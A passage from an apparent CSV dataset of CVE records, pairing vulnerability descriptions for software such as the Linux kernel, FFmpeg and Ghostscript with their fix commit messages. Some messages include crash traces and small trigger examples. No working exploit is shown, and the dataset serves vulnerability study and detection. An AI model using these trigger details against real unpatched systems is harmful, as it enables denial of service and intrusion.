de Melo <acme@redhat.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Kees Cook <keescook@chromium.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Min Chong <mchong@google.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Stephane Eranian <eranian@google.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: Vince Weaver <vincent.weaver@maine.edu> Fixes: f63a8da (""perf: Fix event->ctx locking"") Link: http://lkml.kernel.org/r/20170106131444.GZ3174@twins.programming.kicks-ass.net Signed-off-by: Ingo Molnar <mingo@kernel.org>"
CVE-2019-16910,CWE-200,2019-09-26,"Arm Mbed TLS before 2.19.0 and Arm Mbed Crypto before 2.0.0, when deterministic ECDSA is enabled, use an RNG with insufficient entropy for blinding, which might allow an attacker to recover a private key via side-channel attacks if a victim signs the same message many times. (For Mbed TLS, the fix is also available in versions 2.7.12 and 2.16.3.)",
CVE-2010-0787,CWE-59,2010-03-02,"client/mount.cifs.c in mount.cifs in smbfs in Samba 3.0.22, 3.0.28a, 3.2.3, 3.3.2, 3.4.0, and 3.4.5 allows local users to mount a CIFS share on an arbitrary mountpoint, and gain privileges, via a symlink attack on the mountpoint directory file.",
CVE-2011-2496,CWE-189,2012-06-13,Integer overflow in the vma_to_resize function in mm/mremap.c in the Linux kernel before 2.6.39 allows local users to cause a denial of service (BUG_ON and system crash) via a crafted mremap system call that expands a memory mapping.,"The normal mmap paths all avoid creating a mapping where the pgoff inside the mapping could wrap around due to overflow.  However, an expanding mremap() can take such a non-wrapping mapping and make it bigger and cause a wrapping condition.  Noticed by Robert Swiecki when running a system call fuzzer, where it caused a BUG_ON() due to terminally confusing the vma_prio_tree code.  A vma dumping patch by Hugh then pinpointed the crazy wrapped case.  Reported-and-tested-by: Robert Swiecki <robert@swiecki.net> Acked-by: Hugh Dickins <hughd@google.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-18241,CWE-476,2018-03-21,fs/f2fs/segment.c in the Linux kernel before 4.13 allows local users to cause a denial of service (NULL pointer dereference and panic) by using a noflush_merge option that triggers a NULL value for a flush_cmd_control data structure.,"Mount fs with option noflush_merge, boot failed for illegal address fcc in function f2fs_issue_flush:          if (!test_opt(sbi, FLUSH_MERGE)) {                 ret = submit_flush_wait(sbi);                 atomic_inc(&fcc->issued_flush);   ->  Here, fcc illegal                 return ret;         }  Signed-off-by: Yunlei He <heyunlei@huawei.com> Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>"
CVE-2017-16820,CWE-415,2017-11-14,"The csnmp_read_table function in snmp.c in the SNMP plugin in collectd before 5.6.3 is susceptible to a double free in a certain error case, which could lead to a crash (or potentially have other impact).","snmp_sess_synch_response() always frees request PDU, in both case of request error and success. If error condition occurs inside of `while (status == 0)` loop, double free of `req` happens.  Issue: #2291 Signed-off-by: Florian Forster <octo@collectd.org>"
CVE-2015-3636,,2015-08-06,"The ping_unhash function in net/ipv4/ping.c in the Linux kernel before 4.0.3 does not initialize a certain list data structure during an unhash operation, which allows local users to gain privileges or cause a denial of service (use-after-free and system crash) by leveraging the ability to make a SOCK_DGRAM socket system call for the IPPROTO_ICMP or IPPROTO_ICMPV6 protocol, and then making a connect system call after a disconnect.","If we don't do that, then the poison value is left in the ->pprev backlink.  This can cause crashes if we do a disconnect, followed by a connect().  Tested-by: Linus Torvalds <torvalds@linux-foundation.org> Reported-by: Wen Xu <hotdog3645@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2012-1013,,2012-06-07,"The check_1_6_dummy function in lib/kadm5/srv/svr_principal.c in kadmind in MIT Kerberos 5 (aka krb5) 1.8.x, 1.9.x, and 1.10.x before 1.10.2 allows remote authenticated administrators to cause a denial of service (NULL pointer dereference and daemon crash) via a KRB5_KDB_DISALLOW_ALL_TIX create request that lacks a password.","The fix for #6626 could cause kadmind to dereference a null pointer if a create-principal request contains no password but does contain the KRB5_KDB_DISALLOW_ALL_TIX flag (e.g. ""addprinc -randkey -allow_tix name"").  Only clients authorized to create principals can trigger the bug.  Fix the bug by testing for a null password in check_1_6_dummy.  CVSSv2 vector: AV:N/AC:M/Au:S/C:N/I:N/A:P/E:H/RL:O/RC:C  [ghudson@mit.edu: Minor style change and commit message]  ticket: 7152 target_version: 1.10.2 tags: pullup"
CVE-2016-10129,CWE-476,2017-03-24,The Git Smart Protocol support in libgit2 before 0.24.6 and 0.25.x before 0.25.1 allows remote attackers to cause a denial of service (NULL pointer dereference) via an empty packet line.,"The Git protocol does not specify what should happen in the case of an empty packet line (that is a packet line ""0004""). We currently indicate success, but do not return a packet in the case where we hit an empty line. The smart protocol was not prepared to handle such packets in all cases, though, resulting in a `NULL` pointer dereference.  Fix the issue by returning an error instead. As such kind of packets is not even specified by upstream, this is the right thing to do."
CVE-2017-6850,CWE-476,2017-03-15,The jp2_cdef_destroy function in jp2_cod.c in JasPer before 2.0.13 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted image.,"Also, added some comments marking I/O stream interfaces that probably need to be changed (in the long term) to fix integer overflow problems."
CVE-2014-10073,CWE-22,2018-04-20,The create_response function in server/server.c in Psensor before 1.1.4 allows Directory Traversal because it lacks a check for whether a file is under the webserver directory.,
CVE-2017-9618,CWE-119,2017-07-26,The xps_load_sfnt_name function in xps/xpsfont.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (buffer overflow and application crash) or possibly have unspecified other impact via a crafted document.,
CVE-2017-14170,CWE-834,2017-09-07,"In libavformat/mxfdec.c in FFmpeg 3.3.3 -> 2.4, a DoS in mxf_read_index_entry_array() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted MXF file, which claims a large ""nb_index_entries"" field in the header but does not contain sufficient backing data, is provided, the loop would consume huge CPU resources, since there is no EOF check inside the loop. Moreover, this big loop can be invoked multiple times if there is more than one applicable data segment in the crafted MXF file.","Fixes: 20170829A.mxf  Co-Author: 张洪亮(望初)"" <wangchu.zhl@alibaba-inc.com> Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2017-9608,CWE-476,2017-12-27,"The dnxhd decoder in FFmpeg before 3.2.6, and 3.3.x before 3.3.3 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted mov file.",Fixes: Null pointer dereference  Fixes: CVE-2017-9608 Found-by: Yihan Lian Signed-off-by: Michael Niedermayer <michael@niedermayer.cc> (cherry picked from commit 611b356) Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2015-1339,CWE-399,2016-04-27,Memory leak in the cuse_channel_release function in fs/fuse/cuse.c in the Linux kernel before 4.4 allows local users to cause a denial of service (memory consumption) or possibly have unspecified other impact by opening /dev/cuse many times.,"The problem is that fuse_dev_alloc() acquires an extra reference to cc.fc, and the original ref count is never dropped.  Reported-by: Colin Ian King <colin.king@canonical.com> Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Fixes: cc080e9 (""fuse: introduce per-instance fuse_dev structure"") Cc: <stable@vger.kernel.org> # v4.2+"
CVE-2014-9621,CWE-399,2015-01-21,The ELF parser in file 5.16 through 5.21 allows remote attackers to cause a denial of service via a long string.,commit.
CVE-2017-1000418,CWE-119,2018-01-02,The WildMidi_Open function in WildMIDI since commit d8a466829c67cacbb1700beded25c448d99514e5 allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted file.,Fixes bug #178.
CVE-2018-5764,,2018-01-17,"The parse_arguments function in options.c in rsyncd in rsync before 3.1.3 does not prevent multiple --protect-args uses, which allows remote attackers to bypass an argument-sanitization protection mechanism.",
CVE-2014-3480,CWE-20,2014-07-09,"The cdf_count_chain function in cdf.c in file before 5.19, as used in the Fileinfo component in PHP before 5.4.30 and 5.5.x before 5.5.14, does not properly validate sector-count data, which allows remote attackers to cause a denial of service (application crash) via a crafted CDF file.",at RedHat)
CVE-2010-4648,,2012-06-21,"The orinoco_ioctl_set_auth function in drivers/net/wireless/orinoco/wext.c in the Linux kernel before 2.6.37 does not properly implement a TKIP protection mechanism, which makes it easier for remote attackers to obtain access to a Wi-Fi network by reading Wi-Fi frames.","Enable the port when disabling countermeasures, and disable it on enabling countermeasures.  This bug causes the response of the system to certain attacks to be ineffective.  It also prevents wpa_supplicant from getting scan results, as wpa_supplicant disables countermeasures on startup - preventing the hardware from scanning.  wpa_supplicant works with ap_mode=2 despite this bug because the commit handler re-enables the port.  The log tends to look like:  State: DISCONNECTED -> SCANNING Starting AP scan for wildcard SSID Scan requested (ret=0) - scan timeout 5 seconds EAPOL: disable timer tick EAPOL: Supplicant port status: Unauthorized Scan timeout - try to get results Failed to get scan results Failed to get scan results - try scanning again Setting scan request: 1 sec 0 usec Starting AP scan for wildcard SSID Scan requested (ret=-1) - scan timeout 5 seconds Failed to initiate AP scan.  Reported by: Giacomo Comes <comes@naic.edu> Signed-off by: David Kilroy <kilroyd@googlemail.com> Cc: stable@kernel.org Signed-off-by: John W. Linville <linville@tuxdriver.com>"
CVE-2017-7865,CWE-787,2017-04-14,FFmpeg before 2017-01-24 has an out-of-bounds write caused by a heap-based buffer overflow related to the ipvideo_decode_block_opcode_0xA function in libavcodec/interplayvideo.c and the avcodec_align_dimensions2 function in libavcodec/utils.c.,Fixes out of array access Fixes: 452/fuzz-1-ffmpeg_VIDEO_AV_CODEC_ID_INTERPLAY_VIDEO_fuzzer  Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpeg Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2016-1541,CWE-20,2016-05-07,Heap-based buffer overflow in the zip_read_mac_metadata function in archive_read_support_format_zip.c in libarchive before 3.2.0 allows remote attackers to execute arbitrary code via crafted entry-size values in a ZIP archive.,
CVE-2017-13146,CWE-772,2017-08-23,"In ImageMagick before 6.9.8-5 and 7.x before 7.0.5-6, there is a memory leak in the ReadMATImage function in coders/mat.c.",
CVE-2014-0101,CWE-476,2014-03-11,"The sctp_sf_do_5_1D_ce function in net/sctp/sm_statefuns.c in the Linux kernel through 3.13.6 does not validate certain auth_enable and auth_capable fields before making an sctp_sf_authenticate call, which allows remote attackers to cause a denial of service (NULL pointer dereference and system crash) via an SCTP handshake with a modified INIT chunk and a crafted AUTH chunk before a COOKIE_ECHO chunk.","RFC4895 introduced AUTH chunks for SCTP; during the SCTP handshake RANDOM; CHUNKS; HMAC-ALGO are negotiated (CHUNKS being optional though):    ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] ---------   -------------------- COOKIE-ECHO -------------------->   <-------------------- COOKIE-ACK ---------------------  A special case is when an endpoint requires COOKIE-ECHO chunks to be authenticated:    ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] ---------   ------------------ AUTH; COOKIE-ECHO ---------------->   <-------------------- COOKIE-ACK ---------------------  RFC4895, section 6.3. Receiving Authenticated Chunks says:    The receiver MUST use the HMAC algorithm indicated in   the HMAC Identifier field. If this algorithm was not   specified by the receiver in the HMAC-ALGO parameter in   the INIT or INIT-ACK chunk during association setup, the   AUTH chunk and all the chunks after it MUST be discarded   and an ERROR chunk SHOULD be sent with the error cause   defined in Section 4.1. [...] If no endpoint pair shared   key has been configured for that Shared Key Identifier,   all authenticated chunks MUST be silently discarded. [...]    When an endpoint requires COOKIE-ECHO chunks to be   authenticated, some special procedures have to be followed   because the reception of a COOKIE-ECHO chunk might result   in the creation of an SCTP association. If a packet arrives   containing an AUTH chunk as a first chunk, a COOKIE-ECHO   chunk as the second chunk, and possibly more chunks after   them, and the receiver does not have an STCB for that   packet, then authentication is based on the contents of   the COOKIE-ECHO chunk. In this situation, the receiver MUST   authenticate the chunks in the packet by using the RANDOM   parameters, CHUNKS parameters and HMAC_ALGO parameters   obtained from the COOKIE-ECHO chunk, and possibly a local   shared secret as inputs to the authentication procedure   specified in Section 6.3. If authentication fails, then   the packet is discarded. If the authentication is successful,   the COOKIE-ECHO and all the chunks after the COOKIE-ECHO   MUST be processed. If the receiver has an STCB, it MUST   process the AUTH chunk as described above using the STCB   from the existing association to authenticate the   COOKIE-ECHO chunk and all the chunks after it. [...]  Commit bbd0d59 introduced the possibility to receive and verification of AUTH chunk, including the edge case for authenticated COOKIE-ECHO. On reception of COOKIE-ECHO, the function sctp_sf_do_5_1D_ce() handles processing, unpacks and creates a new association if it passed sanity checks and also tests for authentication chunks being present. After a new association has been processed, it invokes sctp_process_init() on the new association and walks through the parameter list it received from the INIT chunk. It checks SCTP_PARAM_RANDOM, SCTP_PARAM_HMAC_ALGO and SCTP_PARAM_CHUNKS, and copies them into asoc->peer meta data (peer_random, peer_hmacs, peer_chunks) in case sysctl -w net.sctp.auth_enable=1 is set. If in INIT's SCTP_PARAM_SUPPORTED_EXT parameter SCTP_CID_AUTH is set, peer_random != NULL and peer_hmacs != NULL the peer is to be assumed asoc->peer.auth_capable=1, in any other case asoc->peer.auth_capable=0.  Now, if in sctp_sf_do_5_1D_ce() chunk->auth_chunk is available, we set up a fake auth chunk and pass that on to sctp_sf_authenticate(), which at latest in sctp_auth_calculate_hmac() reliably dereferences a NULL pointer at position 0..0008 when setting up the crypto key in crypto_hash_setkey() by using asoc->asoc_shared_key that is NULL as condition key_id == asoc->active_key_id is true if the AUTH chunk was injected correctly from remote. This happens no matter what net.sctp.auth_enable sysctl says.  The fix is to check for net->sctp.auth_enable and for asoc->peer.auth_capable before doing any operations like sctp_sf_authenticate() as no key is activated in sctp_auth_asoc_init_active_key() for each case.  Now as RFC4895 section 6.3 states that if the used HMAC-ALGO passed from the INIT chunk was not used in the AUTH chunk, we SHOULD send an error; however in this case it would be better to just silently discard such a maliciously prepared handshake as we didn't even receive a parameter at all. Also, as our endpoint has no shared key configured, section 6.3 says that MUST silently discard, which we are doing from now onwards.  Before calling sctp_sf_pdiscard(), we need not only to free the association, but also the chunk->auth_chunk skb, as commit bbd0d59 created a skb clone in that case.  I have tested this locally by using netfilter's nfqueue and re-injecting packets into the local stack after maliciously modifying the INIT chunk (removing RANDOM; HMAC-ALGO param) and the SCTP packet containing the COOKIE_ECHO (injecting AUTH chunk before COOKIE_ECHO). Fixed with this patch applied.  Fixes: bbd0d59 (""[SCTP]: Implement the receive and verification of AUTH chunk"") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Vlad Yasevich <yasevich@gmail.com> Cc: Neil Horman <nhorman@tuxdriver.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-12818,CWE-476,2019-06-14,"An issue was discovered in the Linux kernel before 4.20.15. The nfc_llcp_build_tlv function in net/nfc/llcp_commands.c may return NULL. If the caller does not check for this, it will trigger a NULL pointer dereference. This will cause denial of service. This affects nfc_llcp_build_gb in net/nfc/llcp_core.c.","KASAN report this:  BUG: KASAN: null-ptr-deref in nfc_llcp_build_gb+0x37f/0x540 [nfc] Read of size 3 at addr 0000000000000000 by task syz-executor.0/5401  CPU: 0 PID: 5401 Comm: syz-executor.0 Not tainted 5.0.0-rc7+ #45 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014 Call Trace:  __dump_stack lib/dump_stack.c:77 [inline]  dump_stack+0xfa/0x1ce lib/dump_stack.c:113  kasan_report+0x171/0x18d mm/kasan/report.c:321  memcpy+0x1f/0x50 mm/kasan/common.c:130  nfc_llcp_build_gb+0x37f/0x540 [nfc]  nfc_llcp_register_device+0x6eb/0xb50 [nfc]  nfc_register_device+0x50/0x1d0 [nfc]  nfcsim_device_new+0x394/0x67d [nfcsim]  ? 0xffffffffc1080000  nfcsim_init+0x6b/0x1000 [nfcsim]  do_one_initcall+0xfa/0x5ca init/main.c:887  do_init_module+0x204/0x5f6 kernel/module.c:3460  load_module+0x66b2/0x8570 kernel/module.c:3808  __do_sys_finit_module+0x238/0x2a0 kernel/module.c:3902  do_syscall_64+0x147/0x600 arch/x86/entry/common.c:290  entry_SYSCALL_64_after_hwframe+0x49/0xbe RIP: 0033:0x462e99 Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48 RSP: 002b:00007f9cb79dcc58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139 RAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99 RDX: 0000000000000000 RSI: 0000000020000280 RDI: 0000000000000003 RBP: 00007f9cb79dcc70 R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000000 R11: 0000000000000246 R12: 00007f9cb79dd6bc R13: 00000000004bcefb R14: 00000000006f7030 R15: 0000000000000004  nfc_llcp_build_tlv will return NULL on fails, caller should check it, otherwise will trigger a NULL dereference.  Reported-by: Hulk Robot <hulkci@huawei.com> Fixes: eda21f1 (""NFC: Set MIU and RW values from CONNECT and CC LLCP frames"") Fixes: d646960 (""NFC: Initial LLCP support"") Signed-off-by: YueHaibing <yuehaibing@huawei.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-16863,CWE-78,2018-12-03,"It was found that RHSA-2018:2918 did not fully fix CVE-2018-16509. An attacker could possibly exploit another variant of the flaw and bypass the -dSAFER protection to, for example, execute arbitrary shell commands via a specially crafted PostScript document. This only affects ghostscript 9.07 as shipped with Red Hat Enterprise Linux 7.",
CVE-2011-3191,CWE-119,2012-05-24,Integer signedness error in the CIFSFindNext function in fs/cifs/cifssmb.c in the Linux kernel before 3.1 allows remote CIFS servers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a large length value in a response to a read request for a directory.,"The name_len variable in CIFSFindNext is a signed int that gets set to the resume_name_len in the cifs_search_info. The resume_name_len however is unsigned and for some infolevels is populated directly from a 32 bit value sent by the server.  If the server sends a very large value for this, then that value could look negative when converted to a signed int. That would make that value pass the PATH_MAX check later in CIFSFindNext. The name_len would then be used as a length value for a memcpy. It would then be treated as unsigned again, and the memcpy scribbles over a ton of memory.  Fix this by making the name_len an unsigned value in CIFSFindNext.  Cc: <stable@kernel.org> Reported-by: Darren Lavender <dcl@hppine99.gbr.hp.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <sfrench@us.ibm.com>"
CVE-2017-18221,CWE-20,2018-03-07,The __munlock_pagevec function in mm/mlock.c in the Linux kernel before 4.11.4 allows local users to cause a denial of service (NR_MLOCK accounting corruption) via crafted use of mlockall and munlockall system calls.,"Kefeng reported that when running the follow test, the mlock count in meminfo will increase permanently:   [1] testcase  linux:~ # cat test_mlockal  grep Mlocked /proc/meminfo   for j in `seq 0 10`   do  	for i in `seq 4 15`  	do  		./p_mlockall >> log &  	done  	sleep 0.2  done  # wait some time to let mlock counter decrease and 5s may not enough  sleep 5  grep Mlocked /proc/meminfo   linux:~ # cat p_mlockall.c  #include <sys/mman.h>  #include <stdlib.h>  #include <stdio.h>   #define SPACE_LEN	4096   int main(int argc, char ** argv)  { 	 	int ret; 	 	void *adr = malloc(SPACE_LEN); 	 	if (!adr) 	 		return -1;  	 	ret = mlockall(MCL_CURRENT | MCL_FUTURE); 	 	printf(""mlcokall ret = %d\n"", ret);  	 	ret = munlockall(); 	 	printf(""munlcokall ret = %d\n"", ret);  	 	free(adr); 	 	return 0; 	 }  In __munlock_pagevec() we should decrement NR_MLOCK for each page where we clear the PageMlocked flag.  Commit 1ebb7cc (""mm: munlock: batch NR_MLOCK zone state updates"") has introduced a bug where we don't decrement NR_MLOCK for pages where we clear the flag, but fail to isolate them from the lru list (e.g.  when the pages are on some other cpu's percpu pagevec).  Since PageMlocked stays cleared, the NR_MLOCK accounting gets permanently disrupted by this.  Fix it by counting the number of page whose PageMlock flag is cleared.  Fixes: 1ebb7cc ("" mm: munlock: batch NR_MLOCK zone state updates"") Link: http://lkml.kernel.org/r/1495678405-54569-1-git-send-email-xieyisheng1@huawei.com Signed-off-by: Yisheng Xie <xieyisheng1@huawei.com> Reported-by: Kefeng Wang <wangkefeng.wang@huawei.com> Tested-by: Kefeng Wang <wangkefeng.wang@huawei.com> Cc: Vlastimil Babka <vbabka@suse.cz> Cc: Joern Engel <joern@logfs.org> Cc: Mel Gorman <mgorman@suse.de> Cc: Michel Lespinasse <walken@google.com> Cc: Hugh Dickins <hughd@google.com> Cc: Rik van Riel <riel@redhat.com> Cc: Johannes Weiner <hannes@cmpxchg.org> Cc: Michal Hocko <mhocko@suse.cz> Cc: Xishi Qiu <qiuxishi@huawei.com> Cc: zhongjiang <zhongjiang@huawei.com> Cc: Hanjun Guo <guohanjun@huawei.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-9739,CWE-125,2017-07-26,The Ins_JMPR function in base/ttinterp.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) or possibly have unspecified other impact via a crafted document.,
CVE-2016-3136,,2016-05-02,The mct_u232_msr_to_state function in drivers/usb/serial/mct_u232.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted USB device without two interrupt-in endpoint descriptors.,An attack using the lack of sanity checking in probe is known. This patch checks for the existence of a second port.  CVE-2016-3136  Signed-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org [johan: add error message ] Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
CVE-2014-8117,CWE-399,2014-12-17,"softmagic.c in file before 5.21 does not properly limit recursion, which allows remote attackers to cause a denial of service (CPU consumption or crash) via unspecified vectors.",- pull out the guts of saving and restoring the output buffer into functions   and take care not to overwrite the error message if an error happened.
CVE-2015-6937,,2015-10-19,The __rds_conn_create function in net/rds/connection.c in the Linux kernel through 4.2.3 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by using a socket that was not properly bound.,"There was no verification that an underlying transport exists when creating a connection, this would cause dereferencing a NULL ptr.  It might happen on sockets that weren't properly bound before attempting to send a message, which will cause a NULL ptr deref:  [135546.047719] kasan: GPF could be caused by NULL-ptr deref or user memory accessgeneral protection fault: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC KASAN [135546.051270] Modules linked in: [135546.051781] CPU: 4 PID: 15650 Comm: trinity-c4 Not tainted 4.2.0-next-20150902-sasha-00041-gbaa1222-dirty #2527 [135546.053217] task: ffff8800835bc000 ti: ffff8800bc708000 task.ti: ffff8800bc708000 [135546.054291] RIP: __rds_conn_create (net/rds/connection.c:194) [135546.055666] RSP: 0018:ffff8800bc70fab0  EFLAGS: 00010202 [135546.056457] RAX: dffffc0000000000 RBX: 0000000000000f2c RCX: ffff8800835bc000 [135546.057494] RDX: 0000000000000007 RSI: ffff8800835bccd8 RDI: 0000000000000038 [135546.058530] RBP: ffff8800bc70fb18 R08: 0000000000000001 R09: 0000000000000000 [135546.059556] R10: ffffed014d7a3a23 R11: ffffed014d7a3a21 R12: 0000000000000000 [135546.060614] R13: 0000000000000001 R14: ffff8801ec3d0000 R15: 0000000000000000 [135546.061668] FS:  00007faad4ffb700(0000) GS:ffff880252000000(0000) knlGS:0000000000000000 [135546.062836] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [135546.063682] CR2: 000000000000846a CR3: 000000009d137000 CR4: 00000000000006a0 [135546.064723] Stack: [135546.065048]  ffffffffafe2055c ffffffffafe23fc1 ffffed00493097bf ffff8801ec3d0008 [135546.066247]  0000000000000000 00000000000000d0 0000000000000000 ac194a24c0586342 [135546.067438]  1ffff100178e1f78 ffff880320581b00 ffff8800bc70fdd0 ffff880320581b00 [135546.068629] Call Trace: [135546.069028] ? __rds_conn_create (include/linux/rcupdate.h:856 net/rds/connection.c:134) [135546.069989] ? rds_message_copy_from_user (net/rds/message.c:298) [135546.071021] rds_conn_create_outgoing (net/rds/connection.c:278) [135546.071981] rds_sendmsg (net/rds/send.c:1058) [135546.072858] ? perf_trace_lock (include/trace/events/lock.h:38) [135546.073744] ? lockdep_init (kernel/locking/lockdep.c:3298) [135546.074577] ? rds_send_drop_to (net/rds/send.c:976) [135546.075508] ? __might_fault (./arch/x86/include/asm/current.h:14 mm/memory.c:3795) [135546.076349] ? __might_fault (mm/memory.c:3795) [135546.077179] ? rds_send_drop_to (net/rds/send.c:976) [135546.078114] sock_sendmsg (net/socket.c:611 net/socket.c:620) [135546.078856] SYSC_sendto (net/socket.c:1657) [135546.079596] ? SYSC_connect (net/socket.c:1628) [135546.080510] ? trace_dump_stack (kernel/trace/trace.c:1926) [135546.081397] ? ring_buffer_unlock_commit (kernel/trace/ring_buffer.c:2479 kernel/trace/ring_buffer.c:2558 kernel/trace/ring_buffer.c:2674) [135546.082390] ? trace_buffer_unlock_commit (kernel/trace/trace.c:1749) [135546.083410] ? trace_event_raw_event_sys_enter (include/trace/events/syscalls.h:16) [135546.084481] ? do_audit_syscall_entry (include/trace/events/syscalls.h:16) [135546.085438] ? trace_buffer_unlock_commit (kernel/trace/trace.c:1749) [135546.085515] rds_ib_laddr_check(): addr 36.74.25.172 ret -99 node type -1  Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-6308,CWE-190,2017-02-24,"An issue was discovered in tnef before 1.4.13. Several Integer Overflows, which can lead to Heap Overflows, have been identified in the functions that wrap memory allocation.",
CVE-2016-2176,CWE-119,2016-05-05,The X509_NAME_oneline function in crypto/x509/x509_obj.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to obtain sensitive information from process stack memory or cause a denial of service (buffer over-read) via crafted EBCDIC ASN.1 data.,
CVE-2019-13307,CWE-787,2019-07-05,ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow at MagickCore/statistic.c in EvaluateImages because of mishandling rows.,
CVE-2017-13027,CWE-125,2017-09-14,The LLDP parser in tcpdump before 4.9.2 has a buffer over-read in print-lldp.c:lldp_mgmt_addr_tlv_print().,"The total length of the OID is the OID length plus the length of the OID length itself.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2016-8740,CWE-20,2016-12-05,"The mod_http2 module in the Apache HTTP Server 2.4.17 through 2.4.23, when the Protocols configuration includes h2 or h2c, does not restrict request-header length, which allows remote attackers to cause a denial of service (memory consumption) via crafted CONTINUATION frames in an HTTP/2 request.","mod_http2: properly crafted, endless HTTP/2 CONTINUATION frames could be used to exhaust all server's memory.  Reported by: Naveen Tiwari <naveen.tiwari@asu.edu> and CDF/SEFCOM at Arizona State University    git-svn-id: https://svn.apache.org/repos/asf/httpd/httpd/trunk@1772576 13f79535-47bb-0310-9956-ffa450edef68"
CVE-2019-15296,CWE-119,2019-08-21,"An issue was discovered in Freeware Advanced Audio Decoder 2 (FAAD2) 2.8.8. The faad_resetbits function in libfaad/bits.c is affected by a buffer overflow vulnerability. The number of bits to be read is determined by ld->buffer_size - words*4, cast to uint32. If ld->buffer_size - words*4 is negative, a buffer overflow is later performed via getdword_n(&ld->start[words], ld->bytes_left).",https://hackerone.com/reports/502816 https://hackerone.com/reports/507858 https://github.com/videolan/vlc/blob/master/contrib/src/faad2/faad2-fix-overflows.patch
CVE-2016-10272,CWE-119,2017-03-24,"LibTIFF 4.0.7 allows remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via a crafted TIFF image, related to ""WRITE of size 2048"" and libtiff/tif_next.c:64:9.",that the output buffer is correctly incremented to avoid write outside bounds. Reported by Agostino Sarubbo. Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2620
CVE-2014-7842,CWE-362,2014-11-30,"Race condition in arch/x86/kvm/x86.c in the Linux kernel before 3.17.4 allows guest OS users to cause a denial of service (guest OS crash) via a crafted application that performs an MMIO transaction or a PIO transaction to trigger a guest userspace emulation error report, a similar issue to CVE-2010-5313.","Commit fc3a915 (""KVM: X86: Don't report L2 emulation failures to user-space"") disabled the reporting of L2 (nested guest) emulation failures to userspace due to race-condition between a vmexit and the instruction emulator. The same rational applies also to userspace applications that are permitted by the guest OS to access MMIO area or perform PIO.  This patch extends the current behavior - of injecting a #UD instead of reporting it to userspace - also for guest userspace code.  Signed-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2017-14055,CWE-834,2017-08-31,"In libavformat/mvdec.c in FFmpeg 3.3.3, a DoS in mv_read_header() due to lack of an EOF (End of File) check might cause huge CPU and memory consumption. When a crafted MV file, which claims a large ""nb_frames"" field in the header but does not contain sufficient backing data, is provided, the loop over the frames would consume huge CPU and memory resources, since there is no EOF check inside the loop.",Fixes: loop.mv  Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
